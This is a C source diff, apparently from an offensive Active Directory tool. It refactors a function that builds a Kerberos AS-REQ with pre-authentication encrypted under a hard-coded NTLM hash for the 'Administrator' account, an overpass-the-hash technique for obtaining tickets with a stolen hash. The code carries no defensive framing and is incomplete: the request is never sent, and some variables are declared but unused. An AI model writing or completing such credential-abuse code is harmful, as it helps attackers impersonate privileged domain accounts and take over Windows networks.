@@ -49,12 +49,11 @@ NTSTATUS GetDomainControllerInformation(
 }
 
 NTSTATUS GenerateASRequest(
-	_In_ PCSTR Key,
-	_In_ DWORD KeySize,
-	_In_ PCSTR DomainName,
-	_In_ DWORD DomainNameSize,
-	_In_ PCSTR SecurityPrincipal,
-	_In_ DWORD SecurityPrincipalSize
+	_In_  PCSTR  Key,
+	_In_  PCSTR  DomainName,
+	_In_  PCSTR  SecurityPrincipal,
+	_Out_ PBYTE* Request,
+	_Out_ INT32* RequestSize
 ) {
 	// 1. PVNOP and MSG-TYPE
 	ASN_ELEMENT Pvno = { 0x00 };
@@ -63,7 +62,7 @@ NTSTATUS GenerateASRequest(
 
 	// 2 Generate and encrypt the timestamp
 	ASN_ELEMENT EncryptedData = { 0x00 };
-	KerbGenerateEncryptedData(Key, KeySize, &EncryptedData);
+	KerbGenerateEncryptedData(Key, strlen(Key), &EncryptedData);
 
 	// 3 Generate the PAC element
 	ASN_ELEMENT Pac = { 0x00 };
@@ -78,7 +77,17 @@ NTSTATUS GenerateASRequest(
 	);
 
 	// Encode everything
-
+	PBYTE Data = NULL;
+	INT32 DataSize = 0x00;
+	KerbGenerateFinalRequest(
+		&Pvno,
+		&MessageType,
+		&EncryptedData,
+		&Pac,
+		&ReqBody,
+		Request,
+		RequestSize
+	);
 
 	// Exit
 	return STATUS_SUCCESS;
@@ -112,15 +121,15 @@ INT main() {
 	// 2. Build AS-REQ with pre-auth
 	LPSTR SecurityPrincipal = "Administrator";
 	LPSTR NtlmHash = "7FACDC498ED1680C4FD1448319A8C04F";
-	DWORD NtlmHashSize = strlen(NtlmHash);
 
+	PBYTE Request     = NULL;
+	INT32 RequestSize = 0x00;
 	GenerateASRequest(
 		NtlmHash,
-		NtlmHashSize,
 		DCInformation->DomainName,
-		strlen(DCInformation->DomainName),
 		SecurityPrincipal,
-		strlen(SecurityPrincipal)
+		&Request,
+		&RequestSize
 	);
 
 
